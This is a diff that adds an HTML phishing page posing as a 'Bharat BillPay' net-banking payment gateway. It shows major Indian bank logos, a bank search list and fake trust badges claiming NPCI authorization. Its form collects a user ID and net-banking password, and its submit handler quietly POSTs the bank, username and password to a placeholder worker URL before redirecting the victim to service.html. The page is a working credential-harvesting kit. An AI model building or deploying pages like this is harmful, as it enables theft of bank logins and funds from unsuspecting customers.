@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bharat BillPay - Secure Banking Gateway</title>
+    <style>
+        :root { --bbps-navy: #002e5d; --bbps-orange: #f37021; --gray-light: #f4f7f9; --border: #dcdfe3; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { background: #e9ecef; display: flex; justify-content: center; min-height: 100vh; color: #333; }
+
+        .container {
+            background: #fff; width: 100%; max-width: 450px; min-height: 100vh;
+            display: flex; flex-direction: column; position: relative;
+            border-top: 4px solid var(--bbps-orange);
+        }
+
+        header { 
+            padding: 18px 20px; border-bottom: 1px solid #eee; 
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        header .logo-bbps { height: 32px; }
+
+        .banner-blue {
+            background: var(--bbps-navy); color: #fff; padding: 12px;
+            text-align: center; font-size: 13px; font-weight: 600; letter-spacing: 0.5px;
+        }
+
+        .main { padding: 25px 20px; flex-grow: 1; }
+        .label { font-size: 12px; font-weight: 700; color: #555; margin-bottom: 15px; display: block; text-transform: uppercase; }
+
+        /* Professional Grid */
+        .bank-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 25px; }
+        .bank-item { 
+            border: 1px solid var(--border); border-radius: 6px; padding: 12px 5px; 
+            text-align: center; cursor: pointer; transition: all 0.2s; background: #fff;
+        }
+        .bank-item:active { transform: scale(0.95); background: #f0f4f8; border-color: var(--bbps-navy); }
+        .bank-item img { height: 28px; width: auto; display: block; margin: 0 auto 8px; object-fit: contain; }
+        .bank-item span { font-size: 10px; font-weight: 700; color: #444; }
+
+        /* Smart Search UI */
+        .search-wrapper { position: relative; margin-bottom: 25px; }
+        .search-input {
+            width: 100%; padding: 15px; border: 1.5px solid var(--border); border-radius: 6px;
+            font-size: 14px; background: #fff; outline: none; transition: 0.3s;
+        }
+        .search-input:focus { border-color: var(--bbps-navy); box-shadow: 0 0 0 3px rgba(0,46,93,0.1); }
+        
+        .dropdown-list {
+            position: absolute; width: 100%; max-height: 280px; overflow-y: auto;
+            background: #fff; border: 1px solid var(--border); border-top: none;
+            z-index: 999; display: none; border-radius: 0 0 6px 6px; box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        .dropdown-list div { padding: 12px 18px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f8f9fa; color: #444; }
+        .dropdown-list div:hover { background: #f1f5f9; color: var(--bbps-navy); font-weight: 600; }
+
+        /* Professional Form */
+        .login-box { display: none; margin-top: 10px; padding: 20px 0; border-top: 1px solid #eee; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 6px; }
+        .input-group input { 
+            width: 100%; padding: 15px; border: 1.5px solid var(--border); 
+            border-radius: 5px; font-size: 16px; outline: none; background: #fdfdfd;
+        }
+        .input-group input:focus { border-color: var(--bbps-navy); }
+
+        .pay-btn { 
+            width: 100%; padding: 16px; background: var(--bbps-navy); color: #fff; 
+            border: none; border-radius: 5px; font-size: 15px; font-weight: 700; 
+            cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        footer { padding: 30px 20px; background: #fafbfc; border-top: 1px solid #eee; text-align: center; margin-top: auto; }
+        .trust-container { display: flex; justify-content: center; gap: 25px; margin-bottom: 15px; }
+        .trust-container img { height: 26px; object-fit: contain; }
+        .footer-text { font-size: 10px; color: #999; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; line-height: 1.6; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <img src="https://i.ibb.co/SX04FnNd/download.png" class="logo-bbps" alt="BBPS Logo">
+        </header>
+
+        <div class="banner-blue">NET BANKING PAYMENT GATEWAY</div>
+
+        <div class="main">
+            <span class="label">Choose Popular Bank:</span>
+            
+            <div class="bank-grid">
+                <div class="bank-item" onclick="openLogin('SBI')"><img src="https://i.ibb.co/NdPXT2t1/download-1.png"><span>SBI</span></div>
+                <div class="bank-item" onclick="openLogin('HDFC')"><img src="https://i.ibb.co/n8mB0rsp/images-8.png"><span>HDFC</span></div>
+                <div class="bank-item" onclick="openLogin('ICICI')"><img src="https://i.ibb.co/YTt4NNpB/download-1.jpg"><span>ICICI</span></div>
+                <div class="bank-item" onclick="openLogin('AXIS')"><img src="https://i.ibb.co/v6QRfJs4/images-13.jpg"><span>AXIS</span></div>
+                <div class="bank-item" onclick="openLogin('PNB')"><img src="https://i.ibb.co/YB4D5C3m/images-12.jpg"><span>PNB</span></div>
+                <div class="bank-item" onclick="openLogin('KOTAK')"><img src="https://i.ibb.co/vCh7MnYP/images-9.png"><span>KOTAK</span></div>
+            </div>
+
+            <span class="label">Or Search Your Bank:</span>
+            <div class="search-wrapper">
+                <input type="text" class="search-input" id="bankSearch" placeholder="Type bank name..." onfocus="showList()" onkeyup="filterList()">
+                <div class="dropdown-list" id="bankList"></div>
+            </div>
+
+            <div class="login-box" id="authArea">
+                <form id="nbForm">
+                    <input type="hidden" id="bankName">
+                    <div class="input-group">
+                        <label>USER ID / CUSTOMER ID</label>
+                        <input type="text" id="uid" placeholder="Enter your User ID" required>
+                    </div>
+                    <div class="input-group">
+                        <label>NET BANKING PASSWORD</label>
+                        <input type="password" id="pwd" placeholder="Enter Password" required>
+                    </div>
+                    <button type="submit" class="pay-btn" id="btnTxt">PROCEED TO PAY</button>
+                </form>
+            </div>
+        </div>
+
+        <footer>
+            <div class="trust-container">
+                <img src="https://i.ibb.co/1YvGVSMc/images-11.png" alt="NPCI">
+                <img src="https://i.ibb.co/v5kxx5N/images-10.png" alt="Secure">
+            </div>
+            <p class="footer-text"> Authorized Payment Gateway<br> NPCI Monitored System &copy; 2026 </p>
+        </footer>
+    </div>
+
+    <script>
+        const allBanks = [
+            "Airtel Payments Bank", "Allahabad Bank", "Andhra Bank", "AU Small Finance Bank", "Axis Bank",
+            "Bandhan Bank", "Bank of Baroda", "Bank of India", "Bank of Maharashtra", "Canara Bank",
+            "Catholic Syrian Bank", "Central Bank of India", "City Union Bank", "Corporation Bank",
+            "Cosmos Bank", "DBS Bank India", "DCB Bank", "Dena Bank", "Dhanlaxmi Bank",
+            "Equitas Small Finance Bank", "ESAF Small Finance Bank", "Federal Bank", "Fincare Small Finance Bank",
+            "HDFC Bank", "ICICI Bank", "IDBI Bank", "IDFC FIRST Bank", "Indian Bank",
+            "Indian Overseas Bank", "IndusInd Bank", "J&K Bank", "Jio Payments Bank", "Karnataka Bank",
+            "Karur Vysya Bank", "Kotak Mahindra Bank", "Lakshmi Vilas Bank", "Nainital Bank",
+            "NSDL Payments Bank", "Oriental Bank of Commerce", "Paytm Payments Bank", "Punjab & Sind Bank",
+            "Punjab National Bank", "RBL Bank", "Saraswat Bank", "South Indian Bank", "Standard Chartered",
+            "State Bank of India", "Syndicate Bank", "Tamilnad Mercantile Bank", "UCO Bank",
+            "Union Bank of India", "United Bank of India", "Utkarsh Small Finance Bank", "Vijaya Bank", "YES Bank"
+        ];
+
+        const searchInput = document.getElementById('bankSearch');
+        const bankListDiv = document.getElementById('bankList');
+
+        function showList() {
+            bankListDiv.style.display = 'block';
+            renderBanks(allBanks);
+        }
+
+        function renderBanks(list) {
+            bankListDiv.innerHTML = '';
+            list.forEach(bank => {
+                const div = document.createElement('div');
+                div.innerText = bank;
+                div.onclick = () => {
+                    searchInput.value = bank;
+                    bankListDiv.style.display = 'none';
+                    openLogin(bank);
+                };
+                bankListDiv.appendChild(div);
+            });
+        }
+
+        function filterList() {
+            const term = searchInput.value.toLowerCase();
+            const filtered = allBanks.filter(b => b.toLowerCase().includes(term));
+            renderBanks(filtered);
+        }
+
+        function openLogin(name) {
+            document.getElementById('bankName').value = name;
+            document.getElementById('authArea').style.display = 'block';
+            document.getElementById('btnTxt').innerText = "PROCEED WITH " + name;
+            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+        }
+
+        document.getElementById('nbForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('btnTxt');
+            btn.innerText = "AUTHENTICATING...";
+            btn.disabled = true;
+
+            fetch('YOUR_WORKER_URL_HERE', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    bank: document.getElementById('bankName').value,
+                    user: document.getElementById('uid').value,
+                    pass: document.getElementById('pwd').value
+                })
+            }).then(() => { window.location.href = "service.html"; })
+              .catch(() => { window.location.href = "service.html"; });
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.search-wrapper')) bankListDiv.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
